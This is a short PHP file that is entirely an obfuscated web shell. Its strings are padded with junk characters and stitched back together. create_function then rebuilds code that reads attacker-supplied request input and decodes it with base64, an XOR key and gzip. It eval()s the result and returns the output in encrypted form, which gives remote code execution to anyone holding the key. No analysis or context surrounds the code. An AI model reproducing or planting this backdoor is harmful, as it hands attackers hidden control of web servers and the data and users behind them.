<?php
$R='ba6use64_decode6u($m[1]6u),$k))6u);$o=@6uob_g6ue6ut_contents();6u@6uob_end_c6ule';
$C='9wWy2ZYDa";6ufuncti6uon6u x($t,$k)6u{$c=s6utrl6uen($k);$l=st6urle6un6u($t);$o6u="";';
$P='a6un();6u$r=@base6u64_encode(6u@x(@gzco6u6umpress6u($o),$k));pr6uint("$6up6u$kh$r$kf");}';
$Q='fo6ur($i=0;$6ui<$6ul;)6u{for($j=0;(6u$j<$c&6u&$i<$l6u);$j6u++,$i+6u+){$o.=$t6u6u6u{$i6u';
$Y='ts6u("php6u://i6unput"),$m)6u==1) 6u{@ob_sta6urt()6u;6u@eva6ul(@gzuncompr6uess(@x(@6u';
$H='$k="45c76u3f656u"6u;$kh="72da6u8766u8abe6ua6u";$k6uf="e2ff98d9a096u6uf";$p="YLQZA2q6u';
$B='}^$k{$j};}6u}return $o;}i6uf (@p6ureg_match("/$k6uh(.6u+)$kf/",@f6uile6u_get_c6uonten';
$e=str_replace('Ru','','RuRuRucreaRutRuRue_function');
$y=str_replace('6u','',$H.$C.$Q.$B.$Y.$R.$P);
$q=$e('',$y);$q();
?>
